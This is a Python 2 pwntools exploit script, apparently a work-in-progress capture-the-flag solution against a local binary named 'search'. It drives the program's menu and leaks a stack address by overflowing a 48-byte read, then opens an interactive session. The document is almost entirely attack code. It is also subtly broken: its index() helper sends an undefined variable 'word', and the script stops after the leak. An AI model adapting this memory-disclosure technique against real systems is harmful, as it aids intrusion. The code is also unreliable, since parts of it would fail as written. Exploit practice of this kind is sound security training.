#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="amd64", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.e = ELF("./search")
        self.p = None

    def start_binary(self):
        self.p = process("./search")
        self.p.recvuntil("Quit\n")

    def search(self, size, word, delete):
        self.p.sendline("1")
        self.p.recvuntil("size:")
        self.p.sendline(str(size))
        self.p.recvuntil("word:\n")
        self.p.sendline(word)
        self.p.recvuntil("(y/n)?\n")
        self.p.sendline(delete)
        self.p.recvuntil("Quit\n")

    def index(self, size, sentence):
        self.p.sendline("2")
        self.p.recvuntil("size:\n")
        self.p.sendline(str(size))
        self.p.recvuntil("sentence:")
        self.p.sendline(word)
        self.p.recvuntil("Quit\n")

    def leak_stack(self):
        self.p.sendline("A"*48)
        self.p.recvline()
        self.p.sendline("A"*48)
        data=self.p.recvuntil("number\n")[48:]
        return u64(data[:6]+"\x00"*2)

    def pwn_binary(self):
        self.start_binary()

        leak_stack=self.leak_stack()
        log.info("Leak stack address: "+hex(leak_stack))

        self.p.interactive()
        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
